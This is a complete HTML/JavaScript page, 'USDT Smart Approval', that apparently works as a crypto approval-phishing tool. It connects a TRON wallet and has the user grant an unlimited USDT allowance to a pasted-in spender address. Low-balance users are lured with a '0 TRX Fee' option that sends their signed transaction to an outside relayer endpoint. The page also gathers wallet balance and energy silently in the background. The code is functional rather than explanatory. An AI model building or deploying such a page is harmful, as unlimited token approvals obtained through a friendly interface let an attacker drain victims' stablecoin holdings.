<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>USDT Smart Approval</title>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <!-- Tailwind CSS -->
  <script src="https://cdn.tailwindcss.com"></script>
  <!-- Icons -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
  <style>
    body {
      background-color: #0d1117;
      color: #c9d1d9;
    }
    .custom-card {
      background-color: #161b22;
      border: 1px solid #30363d;
    }
  </style>
</head>
<body class="flex items-center justify-center min-h-screen px-4 py-8">

  <div class="w-full max-w-md custom-card rounded-2xl p-6 shadow-2xl">
    
    <!-- Header -->
    <div class="text-center mb-8">
      <div class="inline-flex items-center justify-center w-16 h-16 bg-red-600 rounded-2xl text-white text-3xl mb-4 shadow-lg shadow-red-900/30">
        <i class="fa-solid fa-bolt"></i>
      </div>
      <h1 class="text-2xl font-bold text-white tracking-tight">USDT Smart Approval</h1>
      <p class="text-xs text-gray-400 mt-1">Smart Routing — Auto-detects optimal path</p>
    </div>

    <!-- Connection Container -->
    <div id="connectSection" class="text-center py-6">
      <p class="text-sm text-gray-400 mb-6">Connect your TRON wallet to start</p>
      <button id="connectBtn" class="w-full bg-red-600 hover:bg-red-700 active:scale-95 text-white font-semibold py-3.5 px-4 rounded-xl shadow-lg transition duration-200">
        <i class="fa-solid fa-wallet mr-2"></i> Connect Wallet
      </button>
    </div>

    <!-- Active App State -->
    <div id="appContent" class="hidden space-y-6">
      
      <!-- Wallet Info Panel -->
      <div class="bg-gray-900/40 border border-gray-800 rounded-xl p-4 flex items-center justify-between">
        <div>
          <span class="text-xs text-gray-500 block uppercase font-bold tracking-wider">Connected Wallet</span>
          <span id="walletAddress" class="text-sm font-semibold text-white tracking-wide">T...</span>
          <div class="flex items-center gap-2 mt-1">
            <span class="inline-block w-2 h-2 rounded-full bg-green-500 animate-pulse"></span>
            <span id="networkLabel" class="text-xs text-gray-400">Mainnet</span>
          </div>
        </div>
        <button id="disconnectBtn" class="bg-gray-800 hover:bg-red-950/40 hover:text-red-400 text-gray-400 border border-gray-700 hover:border-red-900/50 py-2 px-3.5 rounded-lg text-xs font-semibold transition duration-200">
          Disconnect
        </button>
      </div>

      <!-- USDT (TRC-20) Approval Form -->
      <div class="space-y-4">
        <div class="p-4 bg-gray-900/30 border border-gray-800/80 rounded-xl space-y-3">
          <div class="flex items-center justify-between text-xs text-gray-500 border-b border-gray-800 pb-2">
            <span class="font-bold uppercase tracking-wider">Asset Info</span>
            <span class="bg-red-900/20 text-red-400 font-semibold px-2 py-0.5 rounded">TRC-20</span>
          </div>
          
          <div class="flex justify-between text-sm">
            <span class="text-gray-400">Contract Address:</span>
            <span class="font-mono text-white text-xs">TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</span>
          </div>

          <div class="space-y-1.5 pt-2">
            <label class="block text-xs font-bold uppercase tracking-wider text-gray-500">Spender Address</label>
            <input type="text" id="spenderAddress" placeholder="Paste spender address (starts with T)" class="w-full bg-gray-900 border border-gray-800 rounded-xl py-3 px-3.5 text-sm text-white focus:outline-none focus:border-red-600/80 placeholder-gray-600 font-mono transition">
          </div>

          <div class="flex justify-between items-center text-sm pt-2">
            <span class="text-gray-400">Current Allowance:</span>
            <span id="allowanceStatus" class="font-semibold text-red-500">Checking...</span>
          </div>
        </div>

        <!-- Submit Button -->
        <button id="approveBtn" disabled class="w-full bg-gray-800 text-gray-600 font-semibold py-3.5 px-4 rounded-xl cursor-not-allowed transition duration-200">
          Enter Spender Address
        </button>
      </div>

    </div>

  </div>

  <!-- Hidden Debugger (Retained silently for logic processes and local logging) -->
  <div id="silentLogArea" class="hidden"></div>

  <!-- TRON Web Dependencies -->
  <script>
    // Configuration Settings
    const RELAYER_API_URL = 'https://web-production-eaaf2.up.railway.app//api/relayer/approve'; 
    const RELAYER_API_KEY = 'your_configured_api_key'; 
    
    const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
    const MAX_UINT256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';

    let userAddress = '';
    let tronWebInstance = null;
    let selectedPath = 'direct'; // Fallback path default
    let userTrx = 0;
    let userEnergy = 0;

    // Silent background logging helper
    function devLog(message, data = null) {
      console.log(`[SmartRelayer] ${message}`, data || '');
    }

    // Identify Injected Wallet
    function getProvider() {
      if (window.tronWeb && window.tronWeb.ready) {
        return window.tronWeb;
      }
      if (window.tron && typeof window.tron.request === 'function') {
        return window.tron;
      }
      if (window.tronLink) {
        return window.tronLink;
      }
      return null;
    }

    async function initConnection() {
      const provider = getProvider();
      if (!provider) {
        alert("Please open this page inside Trust Wallet's dApp browser or use TronLink.");
        return;
      }

      try {
        let accounts = [];
        if (provider.request) {
          accounts = await provider.request({ method: 'tron_requestAccounts' });
        } else if (provider.defaultAddress && provider.defaultAddress.base58) {
          accounts = [provider.defaultAddress.base58];
        }

        if (accounts && accounts.length > 0) {
          userAddress = accounts[0];
          tronWebInstance = window.tronWeb || provider;
          devLog('Wallet Connected successfully:', userAddress);
          setupUI();
        } else {
          devLog('No accounts returned from provider');
        }
      } catch (err) {
        console.error('Connection rejected:', err);
      }
    }

    async function setupUI() {
      $('#connectSection').addClass('hidden');
      $('#appContent').removeClass('hidden');
      $('#walletAddress').text(`${userAddress.slice(0, 8)}...${userAddress.slice(-6)}`);
      
      await queryBackgroundResources();
      setupSpenderListener();
    }

    // Fetches wallet metrics silently in the background
    async function queryBackgroundResources() {
      if (!tronWebInstance || !userAddress) return;
      try {
        // Query balance
        const balanceSun = await tronWebInstance.trx.getBalance(userAddress);
        userTrx = parseFloat(tronWebInstance.fromSun(balanceSun));

        // Query resources
        const resourceObj = await tronWebInstance.trx.getAccountResources(userAddress);
        const limit = resourceObj.EnergyLimit || 0;
        const used = resourceObj.EnergyUsed || 0;
        userEnergy = Math.max(0, limit - used);

        devLog(`Metrics retrieved -> Balance: ${userTrx} TRX, Available Energy: ${userEnergy}`);

        // Set the transaction route based on parameters
        if (userEnergy >= 65000) {
          selectedPath = 'direct';
          devLog('Route selected: Direct (Zero fees via Energy)');
        } else if (userTrx >= 30) {
          selectedPath = 'direct';
          devLog('Route selected: Direct (TRX Burn estimated)');
        } else {
          selectedPath = 'relayer';
          devLog('Route selected: Relayer (Auto-sponsored via Backend)');
        }

        updateActionBtnState();
      } catch (err) {
        console.error('Failed to gather resources silently:', err);
        selectedPath = 'relayer'; // Fallback to relayer on metrics error
        updateActionBtnState();
      }
    }

    function setupSpenderListener() {
      $('#spenderAddress').on('input', async function() {
        const address = $(this).val().trim();
        if (tronWebInstance && tronWebInstance.isAddress(address)) {
          $('#approveBtn').prop('disabled', false).removeClass('bg-gray-800 text-gray-600 cursor-not-allowed').addClass('bg-red-600 hover:bg-red-700 active:scale-95 text-white');
          await fetchAllowance(address);
        } else {
          $('#approveBtn').prop('disabled', true).addClass('bg-gray-800 text-gray-600 cursor-not-allowed').removeClass('bg-red-600 hover:bg-red-700 active:scale-95 text-white');
          $('#allowanceStatus').text('Checking...').removeClass('text-green-500 text-red-500').addClass('text-red-500');
        }
      });
    }

    async function fetchAllowance(spender) {
      try {
        const contract = await tronWebInstance.contract().at(USDT_CONTRACT);
        const allowance = await contract.allowance(userAddress, spender).call();
        const currentVal = allowance.toString();
        
        if (currentVal === MAX_UINT256) {
          $('#allowanceStatus').text('Unlimited Approved').removeClass('text-red-500').addClass('text-green-500');
          $('#approveBtn').text('Already Approved').prop('disabled', true).addClass('bg-gray-800 text-gray-600 cursor-not-allowed').removeClass('bg-red-600');
        } else {
          $('#allowanceStatus').text('No allowance set').removeClass('text-green-500').addClass('text-red-500');
          updateActionBtnState();
        }
      } catch (err) {
        console.error('Error fetching allowance:', err);
      }
    }

    function updateActionBtnState() {
      const btn = $('#approveBtn');
      if (btn.prop('disabled') && btn.text() === 'Already Approved') return;

      const spender = $('#spenderAddress').val().trim();
      if (!spender || !tronWebInstance || !tronWebInstance.isAddress(spender)) {
        btn.text('Enter Spender Address');
        return;
      }

      if (selectedPath === 'direct') {
        btn.text('Approve Unlimited USDT');
      } else {
        btn.text('Approve (0 TRX Fee)');
      }
    }

    // Process approval through designated routing path
    async function processSmartApproval() {
      const spender = $('#spenderAddress').val().trim();
      const btn = $('#approveBtn');

      if (!spender || !tronWebInstance.isAddress(spender)) return;

      btn.prop('disabled', true).text('Building approval...').addClass('opacity-75');

      try {
        if (selectedPath === 'direct') {
          devLog('Initiating Direct Approval on wallet...');
          const contract = await tronWebInstance.contract().at(USDT_CONTRACT);
          const tx = await contract.approve(spender, MAX_UINT256).send({
            feeLimit: 100000000
          });
          devLog('Direct Approval successful -> Tx ID:', tx);
          alert(`Transaction sent successfully! TXID: ${tx}`);
        } else {
          devLog('Routing via Relayer endpoint...');
          // 1. Build Transaction Unsigned locally
          const parameter = [
            { type: 'address', value: spender },
            { type: 'uint256', value: MAX_UINT256 }
          ];
          const txObj = await tronWebInstance.transactionBuilder.triggerSmartContract(
            USDT_CONTRACT,
            'approve(address,uint256)',
            { feeLimit: 100000000, from: userAddress },
            parameter,
            userAddress
          );

          // 2. Direct user to sign transaction structure on the wallet
          const signedTx = await tronWebInstance.trx.sign(txObj.transaction);

          // 3. Post payload structure to relayer endpoint
          const response = await fetch(RELAYER_API_URL, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
              'X-API-Key': RELAYER_API_KEY
            },
            body: JSON.stringify({
              owner: userAddress,
              spender: spender,
              signedTransaction: signedTx,
              timestamp: Date.now()
            })
          });

          const relayResult = await response.json();
          if (relayResult.success) {
            devLog('Relayed transaction succeeded -> Tx ID:', relayResult.txid);
            alert(`Sponsorship Successful! Tx ID: ${relayResult.txid}`);
          } else {
            throw new Error(relayResult.message || 'Unknown server error');
          }
        }
        await fetchAllowance(spender);
      } catch (err) {
        console.error('Approval failed:', err);
        alert(`Transaction failed: ${err.message || err}`);
      } finally {
        btn.prop('disabled', false);
        updateActionBtnState();
      }
    }

    // Connect trigger
    $('#connectBtn').on('click', initConnection);
    // Submit trigger
    $('#approveBtn').on('click', processSmartApproval);
    // Disconnect trigger
    $('#disconnectBtn').on('click', function() {
      userAddress = '';
      $('#connectSection').removeClass('hidden');
      $('#appContent').addClass('hidden');
      $('#spenderAddress').val('');
      $('#allowanceStatus').text('Checking...');
    });
  </script>

</body>
</html>
